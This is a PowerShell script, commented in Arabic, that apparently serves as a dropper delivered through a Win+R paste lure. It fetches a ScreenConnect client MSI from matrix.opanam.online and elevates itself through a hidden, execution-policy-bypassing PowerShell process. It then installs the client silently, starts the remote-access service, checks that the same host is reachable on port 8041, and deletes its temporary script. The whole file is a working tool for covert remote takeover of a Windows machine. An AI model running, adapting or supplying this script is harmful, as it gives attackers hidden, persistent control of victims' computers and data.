# ============================================================
#  ScreenConnect Silent Installer - Win+R Edition
#  + Service Activation & Verification
# ============================================================

$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"

# ============================================================
#  كشف الصلاحيات
# ============================================================
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal   = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdmin     = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ============================================================
#  لو مش Admin → Self-Elevation
# ============================================================
if (-not $isAdmin) {

    $elevatedScript = @'
$ErrorActionPreference = "Stop"
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"
$ResultFile   = Join-Path $env:TEMP "SC_Install_Result.txt"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Message"
    Add-Content -Path $ResultFile -Value $line -Encoding UTF8
}

function Try-Download {
    param($Dir)
    if (-not (Test-Path $Dir)) {
        Write-Log "Directory '$Dir' does not exist."
        return $null
    }
    $target = Join-Path $Dir $FileName
    try {
        Write-Log "Trying to download to: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop
        if (-not (Test-Path $target)) { throw "File not found after download." }
        $size = (Get-Item $target).Length
        Write-Log "Downloaded size: $size bytes"
        if ($size -lt 100KB) { throw "File too small, likely invalid." }
        return $target
    }
    catch {
        Write-Log "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

try {
    Write-Log "=== Installation started ==="
    Write-Log "Running as: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Write-Log "Is Admin: $((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"

    # --- التحميل ---
    $MsiPath = Try-Download -Dir $PrimaryDir
    if (-not $MsiPath) {
        Write-Log "Falling back to TEMP folder..."
        $MsiPath = Try-Download -Dir $FallbackDir
    }
    if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
        throw "Could not download MSI to either C:\ or TEMP."
    }
    Write-Log "MSI downloaded at: $MsiPath"

    # --- التحقق من التوقيع ---
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        throw "File is not a valid MSI. Signature: $signature"
    }
    Write-Log "File signature OK (valid MSI)."

    $LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName

    # --- التثبيت ---
    Write-Log "Installing silently..."
    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $arguments -Wait -PassThru -NoNewWindow
    Write-Log "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010) {
        throw "Installation failed. ExitCode=$($proc.ExitCode). Check log: $LogPath"
    }
    Write-Log "Installation successful (ExitCode=$($proc.ExitCode))"

    # ============================================================
    #  الجزء المهم: تشغيل الخدمة والتحقق منها
    # ============================================================
    Write-Log "Searching for ScreenConnect service..."

    # ننتظر شوية لحد ما الخدمة تتسجل
    Start-Sleep -Seconds 5

    # نبحث عن الخدمة بأي اسم فيه ScreenConnect
    $services = Get-Service | Where-Object {
        $_.Name -like "*ScreenConnect*" -or $_.DisplayName -like "*ScreenConnect*"
    }

    if (-not $services) {
        Write-Log "ERROR: No ScreenConnect service found after install!"
        Write-Log "Listing all services for debugging..."
        Get-Service | Where-Object { $_.DisplayName -like "*Connect*" } | ForEach-Object {
            Write-Log "  Found: $($_.Name) - $($_.DisplayName) - $($_.Status)"
        }
        throw "ScreenConnect service not found."
    }

    foreach ($svc in $services) {
        Write-Log "Found service: $($svc.Name) - $($svc.DisplayName) - Status: $($svc.Status)"

        # لو مش شغالة، نشغلها
        if ($svc.Status -ne "Running") {
            Write-Log "Starting service: $($svc.Name)"
            try {
                Start-Service -Name $svc.Name -ErrorAction Stop
                Write-Log "Service start command sent."
            }
            catch {
                Write-Log "Failed to start service: $($_.Exception.Message)"
            }
        }
        else {
            Write-Log "Service already running."
        }

        # ننتظر لحد ما تبدأ
        $waitMax = 30
        $waited = 0
        while ($waited -lt $waitMax) {
            Start-Sleep -Seconds 2
            $waited += 2
            $svc.Refresh()
            if ($svc.Status -eq "Running") {
                Write-Log "Service is now Running (after ${waited}s)."
                break
            }
        }

        if ($svc.Status -ne "Running") {
            Write-Log "WARNING: Service still not running after ${waitMax}s. Status: $($svc.Status)"

            # نحاول نعرف سبب الفشل
            $svcWmi = Get-CimInstance Win32_Service -Filter "Name='$($svc.Name)'" -ErrorAction SilentlyContinue
            if ($svcWmi) {
                Write-Log "  StartMode: $($svcWmi.StartMode)"
                Write-Log "  State: $($svcWmi.State)"
                Write-Log "  ExitCode: $($svcWmi.ExitCode)"
                Write-Log "  ServiceSpecificExitCode: $($svcWmi.ServiceSpecificExitCode)"
                Write-Log "  PathName: $($svcWmi.PathName)"
            }
        }
    }

    # ============================================================
    #  التحقق من الاتصال بالسيرفر
    # ============================================================
    Write-Log "Testing connection to server..."
    try {
        $test = Test-NetConnection -ComputerName "matrix.opanam.online" -Port 8041 -WarningAction SilentlyContinue
        Write-Log "Server reachable: $($test.TcpTestSucceeded)"
    }
    catch {
        Write-Log "Connection test failed: $($_.Exception.Message)"
    }

    Write-Log "=== Installation completed ==="
    exit 0
}
catch {
    Write-Log "ERROR: $($_.Exception.Message)"
    Write-Log "Stack: $($_.ScriptStackTrace)"
    exit 1
}
'@

    # --- حفظ وتشغيل السكربت بصلاحيات Admin ---
    $tempScript = Join-Path $env:TEMP "SC_Elevated_$(Get-Random).ps1"
    Set-Content -Path $tempScript -Value $elevatedScript -Encoding UTF8

    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`""
        $psi.Verb            = "RunAs"
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow  = $true

        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit()

        Start-Sleep -Seconds 2
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue

        exit $proc.ExitCode
    }
    catch {
        Remove-Item $tempScript -Force -ErrorAction SilentlyContinue
        exit 1
    }
}

Write-Host "Already running as Administrator."
